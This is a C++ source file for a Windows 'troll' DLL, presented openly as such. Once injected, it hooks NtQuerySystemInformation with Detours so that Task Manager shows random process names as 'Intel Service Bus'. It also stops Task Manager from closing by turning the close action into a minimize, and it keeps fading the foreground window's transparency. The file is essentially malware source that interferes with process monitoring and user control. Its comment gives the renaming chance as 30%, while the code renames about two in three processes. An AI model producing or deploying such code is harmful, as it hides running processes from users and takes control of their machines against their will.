/*
This DLL trolls in 2 ways:
    1. (In a seperate thread) constantly get the current active window and change its transparency up and down very slowly.
    2. Hook NtQuerySystemInformation - the API call Task Manager uses to list processes a lot of their info. 
       It then changes the data like so:
       randomly with a 30% chance, a proccess' name will be changed to 'Intel Service Bus'.
*/

#include "pch.h"
#include <detours.h>
#include <winternl.h>
#include <stdlib.h>
#include <thread>
#include <commctrl.h>
#pragma comment(lib, "comctl32.lib")

decltype(&NtQuerySystemInformation) OrgNtQuerySystemInformation = nullptr;
decltype(&RtlInitUnicodeString) pRtlInitUnicodeString = nullptr;
LRESULT CALLBACK SubclassProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData);

HINSTANCE hInst;

NTSTATUS NTAPI HookNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    auto status = OrgNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    if (!NT_SUCCESS(status))
        return status;

    if (SystemInformationClass != SystemProcessInformation)
        return status;

    auto p = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
    do {
        if (rand() % 3) {
            UNICODE_STRING uString;
            pRtlInitUnicodeString = (decltype(&RtlInitUnicodeString))GetProcAddress(GetModuleHandle(L"ntdll"), "RtlInitUnicodeString");
            if (pRtlInitUnicodeString) {
                pRtlInitUnicodeString(&uString, L"Intel Service Bus");
                p->ImageName = uString;
            }
        }
    } while (p->NextEntryOffset && (p = (SYSTEM_PROCESS_INFORMATION*)((PBYTE)p + p->NextEntryOffset)));

    return status;
}

bool InstallEnumHooks() {
    srand(123456);
    OrgNtQuerySystemInformation = (decltype(&NtQuerySystemInformation))GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
    if (DetourTransactionBegin() == NO_ERROR) {
        if (DetourAttach(&(PVOID&)OrgNtQuerySystemInformation, HookNtQuerySystemInformation) == NO_ERROR) {
            return DetourTransactionCommit() == NO_ERROR;
        }
        DetourTransactionAbort();
    }
    return false;
}

void AdjustTransparency() {
    int duration = 60; // Duration in seconds for half fade
    int stepDuration = 100; // Time in milliseconds for each step
    int steps = duration * 1000 / stepDuration;

    // Loop to adjust transparency gradually
    for (int i = 0; i < steps * 2; ++i) {
        HWND hwnd = GetForegroundWindow();  // Fetch the current active window
        if (!hwnd) continue;

        LONG style = GetWindowLong(hwnd, GWL_EXSTYLE);
        SetWindowLong(hwnd, GWL_EXSTYLE, style | WS_EX_LAYERED);

        BYTE currentAlpha;
        if (i < steps) {
            // Fade to 50% transparency
            currentAlpha = 255 - (BYTE)((255 - 128) * i / steps);
        }
        else {
            // Fade back to 100% transparency
            currentAlpha = 128 + (BYTE)((255 - 128) * (i - steps) / steps);
        }
        SetLayeredWindowAttributes(hwnd, 0, currentAlpha, LWA_ALPHA);
        Sleep(stepDuration);
    }
}

bool StupifyUser() {
    std::thread transparencyThread(AdjustTransparency);
    transparencyThread.detach();

    return true;
}

LRESULT CALLBACK CallWndProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        CWPSTRUCT* pCwp = (CWPSTRUCT*)lParam;
        if (pCwp->message == WM_SYSCOMMAND && pCwp->wParam == SC_CLOSE) {
            // Intercept the close button press and minimize the window instead
            ShowWindow(pCwp->hwnd, SW_MINIMIZE);
            return 1;  // Return 1 to stop further processing of this message
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK SubclassProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData) {
    if (message == WM_SYSCOMMAND) {
        if ((wParam & 0xFFF0) == SC_CLOSE) {
            ShowWindow(hWnd, SW_MINIMIZE);
            return 0; // Prevent default handling
        }
    }
    return DefSubclassProc(hWnd, message, wParam, lParam);
}

BOOL InstallQuitHooks(HMODULE hModule) {
    // Set the hook for all threads in the same desktop as the calling thread
    //HHOOK hook = SetWindowsHookEx(WH_CALLWNDPROC, CallWndProc, hInst, 0);
    //return hook != NULL;

    HWND hWnd = FindWindow(L"TaskManagerWindow", NULL);
    if (hWnd) {
        SetWindowSubclass(hWnd, SubclassProc, 1, (DWORD_PTR)hModule);
    }
    return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        return (InstallEnumHooks() 
            && InstallQuitHooks(hModule)
            && StupifyUser());
    }
    return TRUE;
}
